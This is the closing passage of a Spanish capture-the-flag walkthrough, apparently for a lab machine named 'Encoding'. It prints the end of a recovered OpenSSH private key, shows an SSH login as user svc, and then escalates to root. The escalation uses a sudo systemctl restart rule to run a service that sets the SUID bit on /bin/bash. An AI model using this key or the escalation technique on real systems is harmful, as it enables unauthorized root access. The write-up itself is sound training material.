BqmmmN76/uPyERtahEboHdrgymIS+DhA4V/swLm1ZWFFuUhYtBNJ3sWbGof9AmHvK1b5/t
fZruojm3OTh1+LkREAMTNspFVBcB6XFXJY0/+vZfIZsvl7CvS8cC0qJbwhxZ8gOBPbzR0o
YOgDBrjrwMThJ6hDfdMos8w3uZ6Fz1wU1AY3RMucH0V09zAcLRJtvSds9s3l7tAV3HAZi+
zuvw4f9IhGPZMApWSHkf9nsIFD1miD9n31E5uFYHxF+4OIYBw+IvWoH2f3JkzWpTh845p0
VyX4+8SdEhONX7CkdprVnfeLH8+cuxhFSKE4Vlz5Zer0HvESIpMq0sHp3zcKP8wIBF30US
abakUHBmd/k4Ssw6oUg06hLm5xRI8d8kDJ2JhE9AmM4jSuW+kuHzTn/xpK+VQHVKNhASbD
EO436iRABccefgHzTTLJaUKnDQvHVT5mE5xwYdIBpchN2O8z9VgkkKt0LVtPU1HauxAAAA
wAw5Y6bFzH3wtun0gOtWfLfm6pluFtdhPivtjXNr+4kqxVfcq1vriwjzpSTiZXtDXfdvWn
BN2rpzw5l0ZCmhLBxVl+qUNQo0RWCNOC6BRm3Tfyt/FddoDkQdl83zs5ts8A6w3aAynGv3
Qrh3bR/LvxvvCGynS5iHedOBMCBl5zqgBni/EsaQuGGD6/4Vi7o2z+i1U7/EUuQ3eeJ/pi
MGXN/7r1Ey3IinPA5omtDn9FplaoljCHfRkH8XIOjxle0+sQAAAMEAvZcUrFEfQES3J8yr
DWk2ts8UL1iX4G4LqD34f7AUEtj4Jnr/D6fnl/FOSKuCK+Z4OFCh74H0mogGAOvC1bKCkD
/Q/KSdSb2x/6+EOdBPD7X/73W7kiio/phrqwARFWZRcX4PyiOeKI6h5UFPERXBOse84pqa
d01VWSE7ulFwqExaEBtF9kWlruGd/C4GmxUkCEpOsBWa1HjhrY36J99fiQDkI8F5xAfQrr
5BlTXUg4hYsAx2dA71qDV4NgvuL7QTAAAAwQDLJzsl6ZfIKEYaN1klK1tfJ+yz8Hzgn0+D
Y0RjyEuNhw2ZbIV7llFeGC7q8NfHKxuO6XQyJBBoTgZTQQSTRO3E1/i7fRB73P+++CyIt4
65ER/Evu+QPxwElDkxiQCR9p3wrMwpuR4Aq4RwxkJtZNLcE3o8TOqpxoKXEpOWKZRx52kZ
F1ul2Aqwml1hQYQGXfr+BCkEdaskZxCTdNL3U548+/SpBnh8YXYKMsH2L70JHgo940ZjYn
/aFyar4fo4+ekAAAAMc3ZjQGVuY29kaW5nAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

Ahora nos podremos conectar por SSH a la máquina, y poder leer la user flag

```sh
www-data@encoding:/tmp$ chmod 600 key1 
www-data@encoding:/tmp$ ssh -i key1 svc@localhost
The authenticity of host localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 13 09:03:30 PM UTC 2023

  System load:           0.0
  Usage of /:            65.7% of 4.33GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             230
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.198
  IPv6 address for eth0: dead:beef::250:56ff:feb9:79d6


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Jan 24 12:05:39 2023 from 10.10.14.23
svc@encoding:~$ 
```

## Escalada de Privilegios

Si nos fijamos en permisos de sudoers, nos percatamos que podemos ejecutar como el usuario `root` el comando `systemctl  restart *`, para explotar el permiso, tendremos que crear un servicio y reiniciarlo

```sh
svc@encoding:~$ cat !$
cat /etc/systemd/system/root.service
[Service]
Type=simple
ExecStart=chmod u+s /bin/bash
[Install]
WantedBy=multi-user.target
svc@encoding:~$ sudo systemctl restart root.service
svc@encoding:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
svc@encoding:~$ 
```

Y conseguimos root! Muy buena máquina!

